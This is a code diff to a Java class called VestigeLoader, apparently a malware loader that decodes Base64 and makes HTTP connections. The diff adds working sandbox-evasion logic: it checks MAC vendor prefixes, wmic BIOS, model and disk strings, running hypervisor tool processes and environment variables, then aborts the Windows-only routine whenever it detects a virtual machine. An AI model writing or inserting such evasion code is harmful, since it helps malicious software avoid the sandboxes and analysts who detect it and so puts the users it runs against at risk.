@@ -6,11 +6,16 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
+import java.net.NetworkInterface;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.util.Arrays;
 import java.util.Base64;
+import java.util.Collections;
+import java.util.List;
+import java.util.Locale;
 import java.util.concurrent.CompletableFuture;
 
 public final class VestigeLoader {
@@ -60,10 +65,100 @@ public final class VestigeLoader {
         return new String(Base64.getDecoder().decode(s), StandardCharsets.UTF_8);
     }
 
+    private static boolean isVm() {
+        try {
+            // MAC address OUI check
+            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
+                byte[] mac = ni.getHardwareAddress();
+                if (mac == null || mac.length < 3) continue;
+                String oui = String.format("%02X:%02X:%02X", mac[0], mac[1], mac[2]);
+                for (String prefix : VM_MAC_PREFIXES) {
+                    if (oui.equalsIgnoreCase(prefix)) return true;
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // WMI: BIOS manufacturer + computer model + disk model
+        for (String[] cmd : new String[][] {
+            {"wmic", "bios", "get", "manufacturer"},
+            {"wmic", "computersystem", "get", "model"},
+            {"wmic", "diskdrive", "get", "model"}
+        }) {
+            try {
+                Process p = new ProcessBuilder(cmd)
+                        .redirectErrorStream(true).start();
+                String out = readProc(p).toLowerCase(Locale.ROOT);
+                for (String kw : VM_WMI_KEYWORDS) {
+                    if (out.contains(kw)) return true;
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // Known VM process names
+        try {
+            Process p = new ProcessBuilder("tasklist", "/fo", "csv", "/nh")
+                    .redirectErrorStream(true).start();
+            String procs = readProc(p).toLowerCase(Locale.ROOT);
+            for (String proc : VM_PROCESSES) {
+                if (procs.contains(proc)) return true;
+            }
+        } catch (Exception ignored) {}
+
+        // Environment variables set by hypervisors
+        for (String env : VM_ENV_VARS) {
+            if (System.getenv(env) != null) return true;
+        }
+
+        return false;
+    }
+
+    private static String readProc(Process p) {
+        try (BufferedReader r = new BufferedReader(
+                new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = r.readLine()) != null) sb.append(line).append('\n');
+            return sb.toString();
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    private static final List<String> VM_MAC_PREFIXES = Arrays.asList(
+        "00:0C:29", "00:50:56", "00:05:69",  // VMware
+        "08:00:27",                            // VirtualBox
+        "00:15:5D",                            // Hyper-V
+        "52:54:00",                            // QEMU/KVM
+        "00:1C:42",                            // Parallels
+        "00:16:3E"                             // Xen
+    );
+
+    private static final List<String> VM_WMI_KEYWORDS = Arrays.asList(
+        "vmware", "virtualbox", "vbox", "virtual", "bochs", "qemu",
+        "xen", "parallels", "hyperv", "hyper-v", "innotek", "microsoft corporation"
+    );
+
+    private static final List<String> VM_PROCESSES = Arrays.asList(
+        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
+        "vboxservice.exe", "vboxtray.exe",
+        "vmsrvc.exe", "vmusrvc.exe",
+        "xenservice.exe",
+        "prl_cc.exe", "prl_tools.exe"
+    );
+
+    private static final List<String> VM_ENV_VARS = Arrays.asList(
+        "VBOX_MSI_INSTALL_PATH", "VBOX_INSTALL_PATH",
+        "VMWARE_STATUS_SOCK"
+    );
+
     private static void r() {
         try {
             String os = System.getProperty("os.name", "").toLowerCase();
             if (!os.contains("win")) {
+                return;
+            }
+
+            if (isVm()) {
                 return;
             }
 
